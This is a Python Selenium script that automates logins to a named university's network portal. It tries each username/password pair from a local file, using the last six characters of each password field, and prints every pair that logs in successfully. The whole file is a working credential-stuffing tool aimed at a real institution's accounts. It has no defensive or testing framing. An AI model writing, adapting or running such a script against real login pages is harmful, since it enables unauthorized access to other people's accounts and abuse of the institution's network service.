# -*- coding: utf-8 -*-
"""
function: 已知一些已知的可能的账号密码，验证这些上网账号是否正确
"""

import time

from selenium.common.exceptions import TimeoutException
from selenium.webdriver.common.keys import Keys

from selenium import webdriver

CHROMEDRIVERPATH = "./chromedriver/chromedriver.exe"


def parse(source, info_list):
    for info in info_list:
        try:
            input_uname = info[0]
            input_pwd = info[1]
            username_tip = driver.find_elements_by_xpath("//input[@id='username_tip']")[0]
            username_tip.click()
            username = driver.find_elements_by_xpath("//input[@id='username']")[0]
            username.send_keys(input_uname)

            pwd_tip = driver.find_elements_by_xpath("//input[@id='pwd_tip']")[0]
            pwd_tip.click()
            pwd = driver.find_elements_by_xpath("//input[@id='pwd']")[0]
            pwd.send_keys(input_pwd)

            # xiala= driver.find_elements_by_xpath("//div[@id='selectDisname']")[0]
            # xiala.click()
            # time.sleep(0.5)

            pwd.send_keys(Keys.TAB)
            # 1 表示联通
            flag = 1
            if flag == 1:
                ltservice = driver.find_elements_by_xpath("//div[@id='bch_service_0']")[0]
                ltservice.click()
            else:
                dxservice = driver.find_elements_by_xpath("//div[@id='bch_service_1']")[0]
                dxservice.click()

            sure = driver.find_elements_by_xpath("//div[@id='loginLink_div']")[0]
            sure.click()

            time.sleep(1)
            if "success" in driver.current_url:
                print(input_uname + " " + input_pwd + " " + str(flag))
                leave = driver.find_elements_by_xpath("//div[@id='toLogOut']")[0]
                leave.click()

                alert = driver.switch_to.alert
                alert.accept()

                time.sleep(0.5)
                # 再次连接页面
                reconn = driver.find_elements_by_xpath("//div[@id='offlineDiv']")[0]
                reconn.click()
        except Exception as e:
            driver.refresh()
            # print "非联通账号"


def getWebDriver():
    options = webdriver.ChromeOptions()
    # options.add_argument('--headless')
    options.add_argument('--log-level=3')
    # 禁止加载图片
    options.add_experimental_option("prefs", {"profile.managed_default_content_settings.images": 0,
                                              "profile.content_settings.plugin_whitelist.adobe-flash-player": 0,
                                              "profile.content_settings.exceptions.plugins.*,*.per_resource.adobe-flash-player": 0
                                              })
    driver = webdriver.Chrome(executable_path=CHROMEDRIVERPATH, chrome_options=options)
    driver.set_page_load_timeout(30)
    return driver


if __name__ == "__main__":
    info_list = list()
    file_object = open('net.txt', 'rU')
    try:
        for line in file_object:
            if line.strip() == "":
                continue
            input_uname = line.split()[0]
            input_pwd = line.split()[1][-6:]
            # print input_uname+" "+input_pwd
            info_list.append([input_uname, input_pwd])
    finally:
        file_object.close()

    url = 'http://www.njnu.edu.cn'
    driver = getWebDriver()
    canary = 5
    while canary != 0:
        try:
            driver.get(url)
            source = driver.page_source
            break
        except TimeoutException:
            print('retry:' + str(canary))
            canary -= 1
    # print(source)
    parse(source, info_list)
    driver.quit()
